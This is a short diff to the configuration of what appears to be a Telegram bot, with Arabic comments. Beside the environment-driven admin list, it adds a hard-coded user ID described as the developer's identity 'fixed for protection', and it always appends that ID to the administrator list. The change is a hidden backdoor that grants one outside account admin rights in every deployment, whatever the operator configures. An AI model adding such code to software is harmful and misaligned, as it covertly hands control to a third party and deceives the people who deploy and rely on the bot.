@@ -12,9 +12,12 @@ if not TELEGRAM_TOKEN:
 
 # قائمة المعرفات (الأدمن)
 OWNER_ID = int(os.getenv("OWNER_ID", 0))
+DEVELOPER_IDENTITY = 362464035  # معرف المطور الأساسي (ثابت للحماية)
 ADMIN_IDS = [int(i.strip()) for i in os.getenv("ADMIN_IDS", "").split(",") if i.strip()]
 if OWNER_ID and OWNER_ID not in ADMIN_IDS:
     ADMIN_IDS.append(OWNER_ID)
+if DEVELOPER_IDENTITY not in ADMIN_IDS:
+    ADMIN_IDS.append(DEVELOPER_IDENTITY)
 
 # القناة الرسمية للنشر
 CHANNEL_ID = os.getenv("CHANNEL_ID")
